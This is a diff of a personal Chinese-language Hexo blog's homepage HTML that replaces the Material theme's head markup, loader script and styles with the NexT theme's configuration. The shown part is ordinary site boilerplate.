@@ -1,1404 +1,1845 @@
 <!DOCTYPE html>
-<html style="display: none;" >
-    <head>
-    <meta charset="utf-8">
-    <!--
-        © Material Theme
-        https://github.com/viosey/hexo-theme-material
-        Version: 1.4.0 -->
-    <script>window.materialVersion = "1.4.0"</script>
 
-    <!-- Title -->
-    
-    <title>
-        
-        Hyrathon的博客
-    </title>
 
-    <!-- dns prefetch -->
-    <meta http-equiv="x-dns-prefetch-control" content="on">
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
 
-    <!-- Meta & Info -->
-    <meta http-equiv="X-UA-Compatible">
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
-    <meta name="theme-color" content="#0097A7">
-    <meta name="author" content="Joachim Hyrathon">
-    <meta name="description" itemprop="description" content="三流逆向工程师的N流PWNer之旅">
-    <meta name="keywords" content="">
+  
 
-    <!-- Site Verification -->
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
     
     
+  
 
-    <!-- Favicons -->
-    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
-    <link rel="icon" sizes="192x192" href="/img/favicon.png">
-    <link rel="apple-touch-icon" href="/img/favicon.png">
+  
 
-    <!--iOS -->
-    <meta name="apple-mobile-web-app-title" content="Title">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="MobileOptimized" content="480">
+  
 
-    <!-- Add to homescreen for Chrome on Android -->
-    <meta name="mobile-web-app-capable" content="yes">
+  
 
-    <!-- Add to homescreen for Safari on iOS -->
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <meta name="apple-mobile-web-app-title" content="Hyrathon的博客">
+  
 
-    <!-- The Open Graph protocol -->
-    <meta property="og:url" content="http://yoursite.com">
-    <meta property="og:type" content="blog">
-    <meta property="og:title" content="Hyrathon的博客">
-    <meta property="og:image" content="/img/favicon.png" />
-    <meta property="og:description" content="三流逆向工程师的N流PWNer之旅">
+  
     
-
     
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
 
-    <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="Hyrathon的博客">
-    <meta name="twitter:description" content="三流逆向工程师的N流PWNer之旅">
-    <meta name="twitter:image" content="/img/favicon.png">
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:url" content="http://yoursite.com" />
 
-    <!-- Add canonical link for SEO -->
-    
-        <link rel="canonical" href="http://yoursite.com" />
-    
 
-    <!-- Structured-data for SEO -->
-    
-        
-<script type="application/ld+json">
-{
-    "@context": "http://schema.org",
-    "@type": "Website",
-    "publisher": {
-        "@type": "Organization",
-        "name": "Hyrathon的博客",
-        "logo": "/img/favicon.png"
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="三流逆向工程师的N流PWNer之旅">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hyrathon的博客">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Hyrathon的博客">
+<meta property="og:description" content="三流逆向工程师的N流PWNer之旅">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hyrathon的博客">
+<meta name="twitter:description" content="三流逆向工程师的N流PWNer之旅">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
     },
-    "url": "http://yoursite.com/index.html",
-    "image": {
-        "@type": "ImageObject",
-        "url": "/img/favicon.png"
-    },
-    "mainEntityOfPage": {
-        "@type": "WebPage",
-        "@id": "http://yoursite.com"
-    },
-    "description": "三流逆向工程师的N流PWNer之旅"
-}
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
 </script>
 
 
 
-
-    
-
-    <!--[if lte IE 9]>
-        <link rel="stylesheet" href="/css/ie-blocker.css">
-
-        
-            <script src="/js/ie-blocker.en.js"></script>
-        
-    <![endif]-->
-
-    <!-- Import lsloader -->
-    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(key){try{localStorage.removeItem(key)}catch(e){}};lsloader.setLS=function(key,val){try{localStorage.setItem(key,val)}catch(e){}};lsloader.getLS=function(key){var val="";try{val=localStorage.getItem(key)}catch(e){val=""}return val};versionString="/*"+materialVersion+"*/";lsloader.clean=function(){try{var keys=[];for(var i=0;i<localStorage.length;i++){keys.push(localStorage.key(i))}keys.forEach(function(key){var data=lsloader.getLS(key);if(data&&data.indexOf(versionString)===-1){lsloader.removeLS(key)}})}catch(e){}};lsloader.clean();lsloader.load=function(jsname,jspath,cssonload){cssonload=cssonload||function(){};var code;code=this.getLS(jsname);if(code&&code.indexOf(versionString)===-1){this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload);return}if(code){var versionNumber=code.split(versionString)[0];if(versionNumber!=jspath){console.log("reload:"+jspath);this.removeLS(jsname);this.requestResource(jsname,jspath,cssonload);return}code=code.split(versionString)[1];if(/\.js?.+$/.test(versionNumber)){this.jsRunSequence.push({name:jsname,code:code});this.runjs(jspath,jsname,code)}else{document.getElementById(jsname).appendChild(document.createTextNode(code));cssonload()}}else{this.requestResource(jsname,jspath,cssonload)}};lsloader.requestResource=function(name,path,cssonload){var that=this;if(/\.js?.+$/.test(path)){this.iojs(path,name,function(path,name,code){that.setLS(name,path+versionString+code);that.runjs(path,name,code)})}else if(/\.css?.+$/.test(path)){this.iocss(path,name,function(code){document.getElementById(name).appendChild(document.createTextNode(code));that.setLS(name,path+versionString+code)},cssonload)}};lsloader.iojs=function(path,jsname,callback){var that=this;that.jsRunSequence.push({name:jsname,code:""});try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(path,jsname,xhr.response);return}}that.jsfallback(path,jsname)}};xhr.send(null)}catch(e){that.jsfallback(path,jsname)}};lsloader.iocss=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.iofonts=function(path,jsname,callback,cssonload){var that=this;try{var xhr=new XMLHttpRequest;xhr.open("get",path,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){callback(xhr.response);cssonload();return}}that.cssfallback(path,jsname,cssonload)}};xhr.send(null)}catch(e){that.cssfallback(path,jsname,cssonload)}};lsloader.runjs=function(path,name,code){if(!!name&&!!code){for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code=code}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var script=document.createElement("script");script.appendChild(document.createTextNode(this.jsRunSequence[0].code));script.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(script);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var that=this;var script=document.createElement("script");script.src=this.jsRunSequence[0].path;script.type="text/javascript";this.jsRunSequence[0].status="loading";script.onload=function(){that.jsRunSequence.shift();if(that.jsRunSequence.length>0){that.runjs()}};document.body.appendChild(script)}};lsloader.tagLoad=function(path,name){this.jsRunSequence.push({name:name,code:"",path:path,status:"failed"});this.runjs()};lsloader.jsfallback=function(path,name){if(!!this.jsnamemap[name]){return}else{this.jsnamemap[name]=name}for(var k in this.jsRunSequence){if(this.jsRunSequence[k].name==name){this.jsRunSequence[k].code="";this.jsRunSequence[k].status="failed";this.jsRunSequence[k].path=path}}this.runjs()};lsloader.cssfallback=function(path,name,cssonload){if(!!this.cssnamemap[name]){return}else{this.cssnamemap[name]=1}var link=document.createElement("link");link.type="text/css";link.href=path;link.rel="stylesheet";link.onload=link.onerror=cssonload;var root=document.getElementsByTagName("script")[0];root.parentNode.insertBefore(link,root)};lsloader.runInlineScript=function(scriptId,codeId){var code=document.getElementById(codeId).innerText;this.jsRunSequence.push({name:scriptId,code:code});this.runjs()};lsloader.loadCombo=function(jslist){var updateList="";var requestingModules={};for(var k in jslist){var LS=this.getLS(jslist[k].name);if(!!LS){var version=LS.split(versionString)[0];var code=LS.split(versionString)[1]}else{var version=""}if(version==jslist[k].path){this.jsRunSequence.push({name:jslist[k].name,code:code,path:jslist[k].path})}else{this.jsRunSequence.push({name:jslist[k].name,code:null,path:jslist[k].path,status:"comboloading"});requestingModules[jslist[k].name]=true;updateList+=(updateList==""?"":";")+jslist[k].path}}var that=this;if(!!updateList){var xhr=new XMLHttpRequest;xhr.open("get",combo+updateList,true);xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.status>=200&&xhr.status<300||xhr.status==304){if(xhr.response!=""){that.runCombo(xhr.response,requestingModules);return}}else{for(var i in that.jsRunSequence){if(requestingModules[that.jsRunSequence[i].name]){that.jsRunSequence[i].status="failed"}}that.runjs()}}};xhr.send(null)}this.runjs()};lsloader.runCombo=function(comboCode,requestingModules){comboCode=comboCode.split("/*combojs*/");comboCode.shift();for(var k in this.jsRunSequence){if(!!requestingModules[this.jsRunSequence[k].name]&&!!comboCode[0]){this.jsRunSequence[k].status="comboJS";this.jsRunSequence[k].code=comboCode[0];this.setLS(this.jsRunSequence[k].name,this.jsRunSequence[k].path+versionString+comboCode[0]);comboCode.shift()}}this.runjs()}})();</script>
-
-    <!-- Import CSS & jQuery -->
-    
-        <style id="css/material.min.css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("css/material.min.css","/css/material.min.css?fJTiM/K1J3dWIruo3pxtAw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";})</script>
-        <style id="css/style.min.css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("css/style.min.css","/css/style.min.css?oCSEO3ST+aEypEwttTDI9g==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";})</script>
-        
-        
-            <style>
-    
-    .footer-sns-facebook {
-        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHptNjU3LjYgODcuOGw0LjggMy44djU1LjJjMCA1NC42IDAgNTUuMi00LjYgNTkuNi00LjQgNC40LTYgNC42LTUwLjIgNS42bC00NS42IDEtNy4yIDUuNmMtMTAuNCA4LTE2LjggMTcuMi0xOS4yIDI3LjQtMSA1LTEuOCAyNC44LTEuOCA0NCAuMiAzOCAxLjYgNDQuNiAxMC44IDQ4IDIuOCAxLjIgMjguNCAyIDU2LjggMiA0Ny44IDAgNTIgLjIgNTYuMiAzLjhsNC44IDMuOHY1NS4yYzAgNTQuNiAwIDU1LjItNC42IDU5LjYtNC40IDQuNi01LjQgNC42LTU3IDUuMi0yOC44LjItNTQuNC44LTU2LjggMS40LTIuNC42LTUuNiAzLTYuOCA1LjQtMS44IDMuMi0yLjQgNDEuNC0yLjYgMTQzLjJsLS4yIDEzOC44LTUuNiA0LjgtNS42IDQuOEg2MDljLTUyLjQgMC01Mi44IDAtNTguMi00LjZsLTUuNC00LjYtLjItMTQwLjYtLjItMTQwLjYtNC44LTMuOGMtNC4yLTMuNC04LTMuOC0zNS42LTMuOC0zMi44IDAtNDEtMS44LTQzLjYtMTAtLjYtMi4yLTEuMi0yNS40LTEuMi01MS40IDAtNjAuOC0uMi01NyAzLjQtNjEuNiAyLjgtMy42IDYtNCAzNy44LTUgMzMtMSAzNS4yLTEuMiAzOS40LTUuNiA0LjYtNC40IDQuNi01LjIgNS44LTcxIDEuMi03My40LjItNjcuMiAxNi42LTk5LjQgOC0xNS44IDEyLjgtMjIgMjgtMzcgMTUuMi0xNS4yIDIxLjQtMTkuNiAzOC4yLTI4IDExLTUuNCAyNC0xMSAyOS0xMi4yIDYuMi0xLjggMjguNi0yLjYgNzEuMi0yLjYgNTguNi0uMiA2Mi42IDAgNjcgMy42eiIvPjwvc3ZnPg==);
-    }
-    
-    
-    .footer-sns-twitter {
-        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHptNTMyLjggMjA1YzEwIDQgMjMgMTAuOCAyOC44IDE1LjIgMTIuNiA5LjIgMTYuNiAxMC42IDI5LjQgOS40IDYuNi0uNiAxMy0zLjIgMjAuNC04LjIgMTEuMi03LjYgMTkuNC05LjIgMjMuNi01IDMuNiAzLjYgMi44IDktMi44IDE4LjYtNy4yIDEyLjQtNiAxOC44IDQuMiAyNC4yIDQuNCAyLjIgOC4yIDUuNiA4LjYgNy40IDEgNC44LTEyLjYgMjQuMi0yMiAzMS44LTExLjggOS4yLTE3LjIgMjIuNi0xOS42IDQ3LjgtNC44IDUwLjQtNy44IDY2LjYtMTYuNCA4NS40LTMgNy03IDE3LjgtOC44IDI0LTEuOCA2LjQtNSAxNC42LTcuNCAxOC40LTIuMiAzLjgtNy40IDEzLTExLjQgMjAuNC0xNy4yIDMwLjgtNDMuNCA2MS40LTcxLjQgODMuOC0yNS42IDIwLjQtNDYgMzMuMi02NC4yIDQwLjItOC40IDMuMi0xOCA3LjYtMjEuNCA5LjYtNy40IDQuNi0yMi40IDguNi01Ny4yIDE1LTYyLjIgMTEuNi03OS4yIDExLjQtMTM1LjYtMS0zMi40LTctMzguNi05LTUyLTE2LjgtMjEuNC0xMi42LTI0LjItMTQuOC0yNC4yLTE5LjQgMC02LjIgMTAuMi05LjIgMzUtMTAuNCAyMi40LTEgMjguNi0yLjYgNTctMTQuMiAyMy44LTkuOCAyOS40LTEyLjggMzAuNC0xNi44IDIuMi04LjItMy0xMy4yLTI2LjgtMjUuNC0yNS44LTEzLjItMzIuMi0xOC40LTQzLjgtMzUuOC05LTEzLjYtMTAtMjEuMi0zLjYtMzMuNiA1LjQtMTAuOCAzLjYtMTUtMTEuOC0yNS40LTktNi0xNC0xMS42LTIwLjgtMjIuNi0yMy40LTM3LjgtMjUtNTAuOC03LjItNTkuOCA0LjgtMi40IDkuNC01LjQgMTAuMi02LjYgMi44LTQuMi0uNC0xNS42LTguNC0yOS0xMS42LTE5LjYtMTMuMi0yNS44LTEzLjItNTUuMiAwLTI4LjggMi42LTM3LjggMTItNDAuMiA5LTIuMiAxNC44IDEgMzUuNiAyMC4yIDI0LjggMjIuOCA0My42IDM2LjYgNjIuOCA0NS44IDggMy44IDE3LjggOS4yIDIyIDEyIDQuMiAyLjggMTQuOCA3IDIzLjQgOS4yIDguNiAyLjIgMjQuMiA2LjggMzQuOCAxMC4yIDEzLjQgNC40IDIzLjYgNi40IDMzIDYuNiAxMi44LjIgMTQuMi0uMiAxOC42LTUuNCA0LTQuOCA0LjgtNy44IDQuOC0xOS4yIDAtMTQuNCA1LjYtMzkuNiAxMS4yLTUwLjYgNC4yLTguNCAyOS4yLTM0LjIgMzkuOC00MS40IDcuOC01LjQgMzUuNi0xNiA1Mi0yMCAxNC4yLTMuNiAzMi42LTEuMiA1Mi40IDYuOHoiLz48L3N2Zz4=);
-    }
-    
-    
-    .footer-sns-gplus {
-        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzguNiA3OGMtMjIuNCA1LjItNTUuOCA0MC4yLTYwLjYgNjMuNC0xLjQgNi40LTIgMTI5LjgtMS42IDM2Ny42LjYgMjk4LjYgMSAzNTguOCAzLjQgMzYzIDExIDIwLjIgMjEuNiAzMi40IDM3LjIgNDMgMTUgMTAuMiAxNy40IDExLjIgMzMgMTMgMTEuMiAxLjQgMTM2IDIgMzY1IDEuNiAzMTQtLjYgMzQ4LjYtMSAzNTUtMy44IDE1LjgtNy4yIDMzLjgtMjIgNDMuMi0zNS40IDUuMi03LjQgMTAuOC0xNi42IDEyLjYtMjAuNCAyLjgtNi40IDMuMi00MC44IDMuOC0zNTQgLjQtMjIzLS4yLTM1My40LTEuNC0zNjUtMi0xNy0yLjYtMTguNi0xMy0zNC04LjYtMTIuNi0xNC4yLTE4LjQtMjUuMi0yNS44LTcuOC01LjQtMTcuNC0xMS0yMS42LTEyLjQtNi0yLjItNzIuOC0yLjYtMzY1LjQtMi42LTE5Ni44LjItMzYxIC44LTM2NC40IDEuOHpNNDMwIDI5NS40YzQwLjYgMTUuNCA1Ni42IDIzLjggNzIuNiAzOC40IDYuOCA2LjIgNy4yIDE1LjIgMSAyMy40LTYuMiA4LTMzLjYgMzMuOC0zOSAzNi42LTUuNiAyLjgtMTcuNiAyLjgtMjMuMi0uMi0yLjQtMS4yLTguMi01LjItMTMtOC44LTExLjItOC42LTI0LjYtMTEuMi01NS4yLTExLjItMjcuNCAwLTQwLjYgMi42LTUyLjIgMTAuNC00LjQgMi44LTEyLjIgNy42LTE3LjIgMTAuNi0yMyAxMy4yLTUxLjQgNTUtNTUuOCA4Mi40LTIuNiAxNS42LTIuNCAzNC44LjIgNTEgMi44IDE3LjQgMTkuOCA0OC44IDM1LjIgNjUuMiAxNiAxNi42IDQ1IDMzLjYgNjIuOCAzNi42IDI2LjggNC40IDY1LjggMS42IDc5LjQtNS44IDIwLjYtMTEuNCAzMS0xOSA0MS0zMC40IDE4LjgtMjEuNiAyMy40LTM0LjIgMTUuNi00My44LTMuOC00LjgtNC40LTQuOC01MS01LjgtNjAuOC0xLjItNTYuMiAyLjItNTYuMi00My4yIDAtMzIuNC4yLTMzLjIgNC44LTM3IDQuNC0zLjYgOS0zLjggOTItMy44IDc5IDAgODcuOC40IDk0LjIgMy42IDExLjIgNS42IDEzIDExLjQgMTIuOCA0My40IDAgMjUuNC0uOCAzMC44LTcuNiA1OC00IDE2LjYtOS44IDM0LTEyLjYgMzktMi44IDUtOC4yIDE0LjItMTEuNiAyMC42LTguNCAxNS40LTI3LjIgMzYuOC00MC44IDQ2LjYtNS44IDQuNC0xMy44IDEwLjItMTcuNiAxMy4yLTMuOCAzLTExIDctMTYuMiA4LjgtNS4yIDEuOC0xNi4yIDYuNC0yNC40IDEwLTIyLjQgOS42LTM0LjggMTEuNi03MyAxMS42LTM3LjYuMi00Ny0xLjQtNzEtMTItOC4yLTMuNi0xNy42LTcuMi0yMC44LTgtMTUuOC0zLjgtNjctNDUuMi03Ny44LTYyLjgtMi4yLTMuOC03LjYtMTEuNi0xMS44LTE3LjItNC4yLTUuNC05LTE0LTEwLjYtMTktMS44LTQuOC02LjItMTYtMTAtMjQuOC0zLjYtOC44LTcuOC0yMi4yLTkuMi0yOS42LTMuMi0xOC44LTEuNC03OS40IDIuOC05MS40IDEzLjgtNDAuNiAzNS42LTc4IDU4LjgtMTAwLjIgMTQtMTMuNiA0Ny4yLTM2LjQgNTgtMzkuOCA0LjItMS40IDEzLjQtNS4yIDIwLjYtOC40IDIyLTEwIDMyLjgtMTEuNiA3Ni0xMSAzMy44LjYgNDAuNCAxLjIgNTAgNC44em0zNDAuOCA4MC44YzggMy42IDkuNiAxMS4yIDkuMiAzOS4yLS42IDM0LjQtLjYgMzQgNSAzOS42IDQuOCA1IDUuNCA1IDM3LjYgNSA0My40IDAgNDQuNC44IDQzLjIgMzYuMi0uOCAxNy0xLjIgMTguNC02LjQgMjMtNS40IDQuNi02LjYgNC44LTM3LjYgNC44LTMxLjIgMC0zMiAuMi0zNi44IDUtNS42IDUuNC01LjYgNC40LTUgNDEuMi40IDI2LjQuMiAyNy40LTQuNiAzMy00LjggNS42LTYgNS44LTI0LjQgNi40LTIwLjguOC0yOS42LTEuNC0zMy40LTguNC0xLjQtMi42LTItMTUuNi0xLjgtMzUuNi40LTMxLjIuNC0zMS42LTQuNi0zNi42cy01LjYtNS0zNi01Yy0xOC44IDAtMzMtLjgtMzYtMi4yLTcuNi0zLjYtOS42LTExLjItOC44LTMzLjguOC0yOC4yLjQtMjggNDEtMjggNDUuNCAwIDQ1LjQgMCA0NC42LTQyLjYtLjYtMzMtLjYtMzMgNS0zOC40IDQuNC00LjYgNi4yLTUgMjQuOC01IDExIDAgMjIuMiAxIDI1IDIuMnoiLz48L3N2Zz4=);
-    }
-    
-    
-    
-    
-    
-    
-    
-    
-    
-</style>
-
-        
-        <!-- Config CSS -->
-
-<!-- Other Styles -->
-<style>
-  body, html {
-    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
-  }
-
-  a {
-    color: #00838F;
-  }
-
-  .mdl-card__media,
-  #search-label,
-  #search-form-label:after,
-  #scheme-Paradox .hot_tags-count,
-  #scheme-Paradox .sidebar_archives-count,
-  #scheme-Paradox .sidebar-colored .sidebar-header,
-  #scheme-Paradox .sidebar-colored .sidebar-badge{
-    background-color: #0097A7 !important;
-  }
-
-  /* Sidebar User Drop Down Menu Text Color */
-  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
-  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
-    color: #0097A7 !important;
-  }
-
-  #post_entry-right-info,
-  .sidebar-colored .sidebar-nav li:hover > a,
-  .sidebar-colored .sidebar-nav li:hover > a i,
-  .sidebar-colored .sidebar-nav li > a:hover,
-  .sidebar-colored .sidebar-nav li > a:hover i,
-  .sidebar-colored .sidebar-nav li > a:focus i,
-  .sidebar-colored .sidebar-nav > .open > a,
-  .sidebar-colored .sidebar-nav > .open > a:hover,
-  .sidebar-colored .sidebar-nav > .open > a:focus,
-  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
-    color: #0097A7 !important;
-  }
-
-  .toTop {
-    background: #757575 !important;
-  }
-
-  .material-layout .material-post>.material-nav,
-  .material-layout .material-index>.material-nav,
-  .material-nav a {
-    color: #757575;
-  }
-
-  #scheme-Paradox .MD-burger-layer {
-    background-color: #757575;
-  }
-
-  #scheme-Paradox #post-toc-trigger-btn {
-    color: #757575;
-  }
-
-  .post-toc a:hover {
-    color: #00838F;
-    text-decoration: underline;
-  }
-
-</style>
-
-
-<!-- Theme Background Related-->
-
-    <style>
-      body{
-        background-color: #F5F5F5;
-      }
-
-      /* blog_info bottom background */
-      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
-        background-color: #fff;
-      }
-    </style>
+  <link rel="canonical" href="http://yoursite.com/"/>
 
 
 
 
-<!-- Fade Effect -->
 
-    <style>
-      .fade {
-        transition: all 800ms linear;
-        -webkit-transform: translate3d(0,0,0);
-        -moz-transform: translate3d(0,0,0);
-        -ms-transform: translate3d(0,0,0);
-        -o-transform: translate3d(0,0,0);
-        transform: translate3d(0,0,0);
-        opacity: 1;
-      }
-
-      .fade.out{
-        opacity: 0;
-      }
-    </style>
+  <title>Hyrathon的博客</title>
+  
 
 
-<!-- Import Font -->
-
-    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"rel="stylesheet">
 
 
-        <script>lsloader.load("js/jquery.min.js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==")</script>
-    
-    
-    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
 
-    <!-- Analytics -->
-    
 
-    <!-- Custom Head -->
-    
+
+
+
+
+
+
+
+
 </head>
 
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
 
+  
+  
     
-        <body id="scheme-Paradox" class="lazy">
-            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
-                
+  
 
-                <!-- Main Container -->
-                <main class="material-layout__content" id="main">
+  <div class="container sidebar-position-left 
+   page-home 
+ ">
+    <div class="headband"></div>
 
-                    <!-- Top Anchor -->
-                    <div id="top"></div>
-
-                    
-                        <!-- Hamburger Button -->
-                        <button class="MD-burger-icon sidebar-toggle">
-                            <span class="MD-burger-layer"></span>
-                        </button>
-                    
-
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
     
-        <!-- Paradox Header -->
-        <!-- Daily pic -->
-<div class="mdl-card mdl-shadow--2dp daily-pic mdl-cell mdl-cell--8-col index-top-block">
 
-    <!-- Pic & Slogan -->
-    <div class="mdl-card__media mdl-color-text--grey-50" style="background-image:url(/img/daily_pic.png)">
-        <p class="index-top-block-slogan"><a href="#">
-        
-            
-                Hi, nice to meet you
-            
-        
-        </a></p>
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
